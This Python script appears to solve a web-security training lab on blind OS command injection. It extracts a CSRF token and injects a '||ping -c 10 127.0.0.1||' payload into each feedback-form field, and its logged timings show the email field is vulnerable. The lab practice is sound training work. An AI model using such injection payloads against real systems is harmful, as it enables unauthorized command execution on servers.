# Lab: Blind OS command injection with time delays

import requests

base = "https://0a3a00290429141781de4dbc005e002d.web-security-academy.net"
s = requests.Session()

print("===========[step1] Check Product===============")
page_feedback=s.get(f"{base}/feedback")
# page_feedback_result=page_feedback.text
# print(page_feedback_result)
'''
[!] Found POST Method: 

                    <form id="feedbackForm" action="/feedback/submit" method="POST" enctype="application/x-www-form-urlencoded">
                        <input required type="hidden" name="csrf" value="9hchRrR0l5Qj93AOgGR9qpV7sAdWkQnN">
                        <label>Name:</label>
                        <input required type="text" name="name">
                        <label>Email:</label>
                        <input required type="email" name="email">
                        <label>Subject:</label>
                        <input required type="text" name="subject">
                        <label>Message:</label>
                        <textarea required rows="12" cols="300" name="message"></textarea>
                        <button class="button" type="submit">
                            Submit feedback
                        </button>
                        <span id="feedbackResult"></span>
                    </form>
                    <script src="/resources/js/submitFeedback.js"></script>
'''
# Get csrf value
if 'name="csrf"' in page_feedback.text:
    csrf_value = page_feedback.text.split('name="csrf" value="')[1].split('"')[0]


PAYLOAD="abc@d.com||ping -c 10 127.0.0.1||"
print("===========[step2] Send test Feedback===============")
# configure feedback_data
normal_data = {"name": "1", "email": "2@abc.com", "subject": "3", "message": "45"}
for field in normal_data:           # name, email, subject, message
    data = dict(normal_data)        # copy normal_data
    data["csrf"] = csrf_value       # token extracted from step1
    data[field] = PAYLOAD           # 이번 차례 필드만 바꿔치기
    r = s.post(f"{base}/feedback/submit", data=data, timeout=30)
    print(r.request.body)
    print(f"{field:8} → {r.elapsed.total_seconds():.2f}sec / {r.text}")
'''
name=abc%40d.com%7C%7Cping+-c+10+127.0.0.1%7C%7C&email=2%40abc.com&subject=3&message=45&csrf=T5N45uLTVTk7nLAefxfM1DCXG0GozGHc
name     → 1.49sec / {}
name=1&email=abc%40d.com%7C%7Cping+-c+10+127.0.0.1%7C%7C&subject=3&message=45&csrf=T5N45uLTVTk7nLAefxfM1DCXG0GozGHc
email    → 10.94sec / {}
name=1&email=2%40abc.com&subject=abc%40d.com%7C%7Cping+-c+10+127.0.0.1%7C%7C&message=45&csrf=T5N45uLTVTk7nLAefxfM1DCXG0GozGHc
subject  → 1.47sec / {}
name=1&email=2%40abc.com&subject=3&message=abc%40d.com%7C%7Cping+-c+10+127.0.0.1%7C%7C&csrf=T5N45uLTVTk7nLAefxfM1DCXG0GozGHc
message  → 1.15sec / {}
'''
